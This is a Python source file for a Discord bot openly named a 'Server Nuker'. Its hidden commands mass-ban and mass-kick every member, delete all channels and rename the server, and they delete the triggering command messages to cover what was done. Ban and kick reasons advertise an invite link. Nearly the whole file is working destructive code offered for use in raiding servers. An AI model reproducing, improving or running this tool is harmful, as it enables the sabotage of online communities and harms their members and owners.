import discord
import asyncio
import threading
import concurrent.futures
import fade
import os
import time 
import colorama
import ctypes
from colorama import Fore, Back, Style
from discord.ext import commands

intents = discord.Intents.default()
intents.members = True 
intents.message_content = True  

colorama.init(autoreset=True)

ctypes.windll.kernel32.SetConsoleTitleW('Infernal - Discord Server Nuker')

bot = commands.Bot(command_prefix='!', intents=intents)
text_art = """    
                                      
   ██▓ ███▄    █   █████▒▓█████  ██▀███   ███▄    █  ▄▄▄       ██▓    
  ▓██▒ ██ ▀█   █ ▓██   ▒ ▓█   ▀ ▓██ ▒ ██▒ ██ ▀█   █ ▒████▄    ▓██▒            !banall !kickall
  ▒██▒▓██  ▀█ ██▒▒████ ░ ▒███   ▓██ ░▄█ ▒▓██  ▀█ ██▒▒██  ▀█▄  ▒██░      !removechannels !servername
  ░██░▓██▒  ▐▌██▒░▓█▒  ░ ▒▓█  ▄ ▒██▀▀█▄  ▓██▒  ▐▌██▒░██▄▄▄▄██ ▒██░    
  ░██░▒██░   ▓██░░▒█░    ░▒████▒░██▓ ▒██▒▒██░   ▓██░ ▓█   ▓██▒░██████▒
  ░▓  ░ ▒░   ▒ ▒  ▒ ░    ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒░▓  ░   ifs?
   ▒ ░░ ░░   ░ ▒░ ░       ░ ░  ░  ░▒ ░ ▒░░ ░░   ░ ▒░  ▒   ▒▒ ░░ ░ ▒  ░   
   ▒ ░   ░   ░ ░  ░ ░       ░     ░░   ░    ░   ░ ░    
    ░   ▒     ░ ░   
   ░           ░            ░  ░   ░              ░       ░  ░    ░  ░
                                                                    
                                                       
"""                                 
artlol = fade.blackwhite(text_art)

current_time = ""

def update_time():
    global current_time
    while True:
        t = time.localtime()
        current_time = time.strftime("%H:%M:%S", t)
        time.sleep(1)

time_thread = threading.Thread(target=update_time)
time_thread.daemon = True
time_thread.start()


time.sleep(1)

print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.LIGHTBLACK_EX}~{Fore.RESET}] Initializing Bot..")           

@bot.event
async def on_ready():
    print(f'[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.LIGHTBLACK_EX}~{Fore.RESET}] {bot.user} has connected to Discord!')
    os.system('cls')
    print(artlol)
    print 


@bot.command(name='banall', hidden=True)
async def ban_all(ctx):
    await ctx.message.delete()
    ctypes.windll.kernel32.SetConsoleTitleW('Infernal - Banning') 
    tasks = []
    for member in ctx.guild.members:
        task = asyncio.create_task(ban_member(ctx, member, reason='Infernal https://discord.gg/2sZcY3tyns', delete_message_days=0))
        tasks.append(task)
    await asyncio.gather(*tasks, limit=10, return_exceptions=True)
    ctypes.windll.kernel32.SetConsoleTitleW('Infernal - Discord Server Nuker')

async def ban_member(ctx, member, reason, delete_message_days, retries=3):
    for attempt in range(retries):
        try:
            await ctx.guild.ban(member, reason=reason, delete_message_days=delete_message_days)
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.GREEN}+{Fore.RESET}] Banned {member.id} ({member.name}#{member.discriminator})")
            return
        except discord.Forbidden:
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.RED}-{Fore.RESET}] Skipping {member.id} ({member.name}#{member.discriminator}) (no permission to ban)")
            return
        except discord.HTTPException as e:
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.RED}-{Fore.RESET}] Error banning {member.id} ({member.name}#{member.discriminator}) (attempt {attempt+1}/{retries})")
            await asyncio.sleep(1)
    print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}]  [{Fore.RED}-{Fore.RESET}] Skipping {member.id} ({member.name}#{member.discriminator}) (all retries failed)")

@bot.command(name='kickall', hidden=True)
async def kick_all(ctx):
    await ctx.message.delete() 
    ctypes.windll.kernel32.SetConsoleTitleW('Infernal - Kicking')
    tasks = []
    for member in ctx.guild.members:
        task = asyncio.create_task(kick_member(ctx, member, reason='Infernal https://discord.gg/2sZcY3tyns'))
        tasks.append(task)
    await asyncio.gather(*tasks, limit=10, return_exceptions=True)
    await ctx.send('Kicked all members!')
    ctypes.windll.kernel32.SetConsoleTitleW('Infernal - Discord Server Nuker')

async def kick_member(ctx, member, reason, retries=3):
    for attempt in range(retries):
        try:
            await member.kick(reason=reason)
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.GREEN}+{Fore.RESET}] Kicked {member.id} ({member.name}#{member.discriminator})")
            return
        except discord.Forbidden:
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.RED}-{Fore.RESET}] Skipping {member.id} ({member.name}#{member.discriminator}) (no permission to kick)")
            return
        except discord.HTTPException as e:
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.RED}-{Fore.RESET}] Error kicking {member.id} ({member.name}#{member.discriminator}) (attempt {attempt+1}/{retries})")
            await asyncio.sleep(1)
    print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}]  [{Fore.RED}-{Fore.RESET}] Skipping {member.id} ({member.name}#{member.discriminator}) (all retries failed)")


@bot.command(name='removechannels', hidden=True)
async def remove_all_channels(ctx):
    await ctx.message.delete()
    ctypes.windll.kernel32.SetConsoleTitleW('Infernal - Removing Channels') 
    tasks = []
    for channel in await ctx.guild.fetch_channels():
        tasks.append(asyncio.create_task(delete_channel_with_retries(channel, 5)))
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for result in results:
        if isinstance(result, Exception):
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.RED}-{Fore.RESET}] Error deleting channel: {result}")
        else:
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.GREEN}+{Fore.RESET}] Deleted channel: {channel.name}")
    ctypes.windll.kernel32.SetConsoleTitleW('Infernal - Discord Server Nuker')

async def delete_channel_with_retries(channel, retries):
    for attempt in range(retries):
        try:
            await channel.delete(reason='Deleted by bot')
            return
        except discord.Forbidden:
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.RED}-{Fore.RESET}] Skipping {channel.name} (no permission to delete)")
            return
        except asyncio.CancelledError:
            raise
        except Exception as e:
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.RED}-{Fore.RESET}] Error deleting channel {channel.name} (attempt {attempt+1}/{retries})")
            await asyncio.sleep(1)
    print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.RED}-{Fore.RESET}] Skipping {channel.name} (all retries failed)")


@bot.command(name='servername', hidden=True)
async def change_server_name(ctx):
    await ctx.message.delete()  
    server = ctx.guild
    new_name = input(' Server Name > ')
    try:
        await server.edit(name=new_name)
        print(f'[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.GREEN}+{Fore.RESET}] Server name changed to {new_name}')
    except discord.Forbidden:
        print(f'[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.RED}-{Fore.RESET}] Failed to change server name (no permission)')

#Add your token into here
bot.run('ENTER_TOKEN_HERE', log_handler=None)
